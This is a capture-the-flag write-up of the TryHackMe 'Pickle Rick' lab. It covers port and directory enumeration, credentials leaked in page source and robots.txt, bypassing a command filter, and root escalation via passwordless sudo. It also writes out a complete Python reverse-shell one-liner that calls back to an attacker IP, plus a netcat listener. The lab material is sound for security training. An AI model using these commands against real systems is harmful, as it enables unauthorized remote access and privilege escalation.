# Pickle Rick

**Date:** 18, May, 2021

**Author:** Dhilip Sanjay S

---

## Nmap Enumeration

```bash
nmap -sC -sV -p- 10.10.241.9 -oN nmap.out
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-18 22:22 IST

Nmap scan report for 10.10.241.9
Host is up (0.17s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b0:7b:e7:02:7d:b7:f0:c7:e9:c3:bc:b4:e8:dd:7f:f3 (RSA)
|   256 23:cb:f6:b0:5b:52:d5:97:96:09:66:40:81:b2:e8:c0 (ECDSA)
|_  256 36:5a:dc:a0:79:06:c2:3d:51:ab:0b:6a:bb:4d:ce:c5 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Rick is sup4r cool
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 501.79 seconds
```

## Gobuster Enumeration on port 80

```bash
$ gobuster dir -u http://10.10.241.9 -t 50 -w /usr/share/wordlists/dirb/common.txt -x php,sh,txt,xml,log,js,cgi,py
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.241.9
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              xml,log,js,cgi,py,php,sh,txt
[+] Timeout:                 10s
===============================================================
2021/05/18 23:05:18 Starting gobuster in directory enumeration mode
===============================================================
/.htaccess.txt        (Status: 403) [Size: 299]
/.htaccess.xml        (Status: 403) [Size: 299]
/.htaccess.cgi        (Status: 403) [Size: 299]
/.htaccess.php        (Status: 403) [Size: 299]
/.htpasswd.php        (Status: 403) [Size: 299]
/.htaccess            (Status: 403) [Size: 295]
/.htpasswd.js         (Status: 403) [Size: 298]
/.htaccess.sh         (Status: 403) [Size: 298]
/.htpasswd.cgi        (Status: 403) [Size: 299]
/.htaccess.log        (Status: 403) [Size: 299]
/.htpasswd.py         (Status: 403) [Size: 298]
/.htaccess.js         (Status: 403) [Size: 298]
/.htpasswd.txt        (Status: 403) [Size: 299]
/.htaccess.py         (Status: 403) [Size: 298]
/.htpasswd.xml        (Status: 403) [Size: 299]
/.htpasswd            (Status: 403) [Size: 295]
/.htpasswd.log        (Status: 403) [Size: 299]
/.htpasswd.sh         (Status: 403) [Size: 298]
/.hta.js              (Status: 403) [Size: 293]
/.hta.py              (Status: 403) [Size: 293]
/.hta.php             (Status: 403) [Size: 294]
/.hta.txt             (Status: 403) [Size: 294]
/.hta.xml             (Status: 403) [Size: 294]
/.hta.log             (Status: 403) [Size: 294]
/.hta                 (Status: 403) [Size: 290]
/.hta.cgi             (Status: 403) [Size: 294]
/.hta.sh              (Status: 403) [Size: 293]
/assets               (Status: 301) [Size: 311] [--> http://10.10.241.9/assets/]
/denied.php           (Status: 302) [Size: 0] [--> /login.php]                  
/index.html           (Status: 200) [Size: 1062]                                
/login.php            (Status: 200) [Size: 882]                                 
/portal.php           (Status: 302) [Size: 0] [--> /login.php]                  
/robots.txt           (Status: 200) [Size: 17]                            
/server-status        (Status: 403) [Size: 299]                                 
                                                                                
===============================================================
2021/05/18 23:07:36 Finished
===============================================================
```

## Information leaked
### Username

- By viewing the source code on the index page, we find the username: `R1ckRul3s`

```html
<!--

    Note to self, remember username!

    Username: R1ckRul3s

  -->
```

### Robots.txt

- The robots.txt file surprisingly didn't contain **Disllow**, instead it had:

```
Wubbalubbadubdub
```

## Login.php

- Visit `http://10.10.241.9/login.php`
- Enter the username as `R1ckRul3s`.
- For the password, try to enter the content of robots.txt: `Wubbalubbadubdub`
- And voila! we are logged in!

## Executing commands

- The `portal.php` allowed us to run any bash command. 
- By running `ls`, the following result was obtained:
```bash
Sup3rS3cretPickl3Ingred.txt
assets
clue.txt
denied.php
index.html
login.php
portal.php
robots.txt
```

- Encoded string in `portal.php`:

```bash
Vm1wR1UxTnRWa2RUV0d4VFlrZFNjRlV3V2t0alJsWnlWbXQwVkUxV1duaFZNakExVkcxS1NHVkliRmhoTVhCb1ZsWmFWMVpWTVVWaGVqQT0==
```

- I tried to read the file using
    - cat
    - tail
    - head
- But all those commands were disabled.

- I saw [John Hammond's Walkthrough](https://www.youtube.com/watch?v=oCAtfcr3iUw) to bypass the filter.

```bash
grep . clue.txt

(or)

while read line; do echo $line; done < clue.txt

Look around the file system for the other ingredient.
```

- But the files in this particular directory can be read without using the above two commands - by just visiting `http://10.10.241.9/clue.txt`


### What is the first ingredient Rick needs?
- **Answer:** mr. meeseek hair
- **Steps to Reproduce:** 
    - Commands to read `Sup3rS3cretPickl3Ingred.txt` file:

    ```bash
    grep . Sup3rS3cretPickl3Ingred.txt

    (or)

    while read line; do echo $line; done < Sup3rS3cretPickl3Ingred.txt
    ```
    
---

### What is the second ingredient Rick needs?
- **Answer:** 1 jerry tear
- **Steps to Reproduce:** 

- As per the clue, I was searching for the other ingredient in the file system and the **second ingredient** was in the directory `/home/rick`.

```bash
cd /home/rick/; ls -la; grep . "second ingredients"

total 12
drwxrwxrwx 2 root root 4096 Feb 10  2019 .
drwxr-xr-x 4 root root 4096 Feb 10  2019 ..
-rwxrwxrwx 1 root root   13 Feb 10  2019 second ingredients
1 jerry tear
```

---

### Whats the final ingredient Rick needs?
- **Answer:** fleeb juice
- **Steps to Reproduce:** 

    - By Running `sudo -l`, you can find the permission of user to run the commands as root user.
    - Apparently `www-data` had permission to run **all the commands without password**.
    
    ```bash
    sudo -l 

    Matching Defaults entries for www-data on ip-10-10-36-31.eu-west-1.compute.internal:
        env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

    User www-data may run the following commands on ip-10-10-36-31.eu-west-1.compute.internal:
        (ALL) NOPASSWD: ALL
    ```

    - Locating the third ingredient:

    ```bash
    sudo ls /root

    3rd.txt
    snap

    sudo less /root/3rd.txt

    3rd ingredients: fleeb juice
    ```

---

## Attempt 2 - getting reverse shell

- After watching John's video, I realised that proper way of **pwing a room/box** is by using reverse shell. So, here we go again!

- Using python reverse shell and listening on netcat:

```py
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.17.7.91",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

- Upgrading shell:

```bash
nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.17.7.91] from (UNKNOWN) [10.10.36.31] 46354
/bin/sh: 0: cant access tty; job control turned off
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@ip-10-10-36-31:/var/www/html$ ^Z
[1]+  Stopped                 nc -lvnp 1234
root@kali:~/Desktop/CTF/TryHackMe/pickle_rick# stty raw -echo; fg
nc -lvnp 1234

www-data@ip-10-10-36-31:/var/www/html$ export "TERM=xterm"
```

- Gaining root acess and all the ingredients:

```bash
www-data@ip-10-10-36-31:/var/www/html$ ls
Sup3rS3cretPickl3Ingred.txt  clue.txt	 index.html  portal.php
assets			     denied.php  login.php   robots.txt
www-data@ip-10-10-36-31:/var/www/html$ cat Sup3rS3cretPickl3Ingred.txt 
mr. meeseek hair

www-data@ip-10-10-36-31:/var/www/html$ sudo -l
Matching Defaults entries for www-data on
    ip-10-10-36-31.eu-west-1.compute.internal:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on
        ip-10-10-36-31.eu-west-1.compute.internal:
    (ALL) NOPASSWD: ALL

www-data@ip-10-10-36-31:/var/www/html$ sudo bash
root@ip-10-10-36-31:/var/www/html# id
uid=0(root) gid=0(root) groups=0(root)

root@ip-10-10-36-31:/var/www/html# cd
root@ip-10-10-36-31:~# ls
3rd.txt  snap
root@ip-10-10-36-31:~# cat 3rd.txt 
3rd ingredients: fleeb juice

root@ip-10-10-36-31:~# cd /home/
root@ip-10-10-36-31:/home# ls
rick  ubuntu
root@ip-10-10-36-31:/home# cd rick/
root@ip-10-10-36-31:/home/rick# ls 
second ingredients
root@ip-10-10-36-31:/home/rick# cat second\ ingredients 
1 jerry tear
```

## References

- [John Hammond's Walkthrough](https://www.youtube.com/watch?v=oCAtfcr3iUw)
- [Pentest Monkey's Reverse Shell cheatsheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)